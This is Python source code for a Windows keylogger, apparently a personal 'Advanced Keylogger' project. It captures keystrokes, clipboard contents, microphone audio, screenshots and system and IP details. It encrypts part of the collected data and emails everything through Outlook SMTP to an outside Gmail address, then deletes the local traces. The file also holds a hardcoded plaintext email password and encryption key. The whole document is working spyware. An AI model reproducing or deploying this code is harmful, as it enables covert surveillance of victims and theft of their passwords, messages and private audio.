# required modules for the project

# first set of modules
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# next set of modules will be used to find get some system information
import socket
import platform

# for using the clipboard of the operating system
import win32clipboard

# get the keystrokes from the keyboard that user type
from pynput.keyboard import Key, Listener

import time
import os

# for the using the microphone features of the system
from scipy.io.wavfile import write
import sounddevice as sd

# for encrypting the file
from cryptography.fernet import Fernet

# to get the user name and another related information
import getpass
from requests import get

# to use the screenshot functionality
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


keys_information = "key_log.txt"
file_path = "D:\\Shubham\\Advanced Keylogger\\Major\\Project\\"

system_information = "systeminfo.txt"
clipboard_information = "clipboardinfo.txt"
microphone_time = 10
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

time_iterations = 15
number_of_iterations_end = 3

key = "swqYAFY-PQsJndC1UjHmCQiGA9c2o4mQvb_8N-ycKaI="

email = "prajapatishubham11@outlook.com"
password = "Outlook_sp11"
toaddr = "shubhamsps135@gmail.com"



# function to send the email with the attachment of logfile generated on the system
def send_email(filename, attachment, toaddr):
    fromaddr = email
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "this is the generated log file"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p=MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
    msg.attach(p)

    s=smtplib.SMTP('smtp-mail.outlook.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

send_email(keys_information, file_path+keys_information, toaddr)


# function for sharing the system information of the host computer, extraction of system information is done through socket module
def computer_information():
    with open(file_path+system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: "+ public_ip + '\n')
        except Exception:
            f.write("Could not able to the IP Address")

        f.write("Processor: "+ (platform.processor()) + '\n')
        f.write("System: "+ platform.system() + " " + platform.version() + '\n')
        f.write("Machine: "+platform.machine()+'\n')
        f.write("Hostname: "+hostname+'\n')
        f.write("Private IP Address: " + IPAddr+'\n')

computer_information()

# function to get the clipboard information of the host computer
def copy_clipboard():
    with open(file_path+clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard data: \n" + data)
        except:
            f.write("Clipboard Error")

copy_clipboard()

# function to share the microphone audio information of the system of the host device
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path+audio_information, fs, myrecording)

microphone()

# function to share the screenshot of screen of the host device
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+screenshot_information)

screenshot()

number_of_iterations = 0
current_time = time.time()
stopping_time = time.time() + time_iterations


while(number_of_iterations < number_of_iterations_end):
    count = 0
    keys = []

    # this function will append all the keys pressed by user in the keyboard to the list
    def on_press(key):
        global keys, count, current_time
        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if(count>=1):
            count = 0
            write_file(keys)
            keys = []

    # this function will open a file and where all keys logs are stored and remove the quotes
    def write_file(keys):
        with open(file_path + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    # function to get exit out of the keylogger
    def on_release(key):
        if(key==Key.esc):
            return False
        if(current_time > stopping_time):
            return False

    # function to combine the on press and on release function and do the working
    with Listener (on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if(current_time > stopping_time):
        with open(file_path+keys_information, "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_information, file_path+screenshot_information, toaddr)
        copy_clipboard()
        number_of_iterations += 1
        current_time=time.time()
        stopping_time = time.time() + time_iterations


files_to_encrypt = [file_path+system_information, file_path+clipboard_information, file_path+keys_information]
encrypted_file_names = [file_path+system_information_e, file_path+clipboard_information_e, file_path+keys_information_e]

count = 0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count+=1

time.sleep(120)


delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_path + file)






















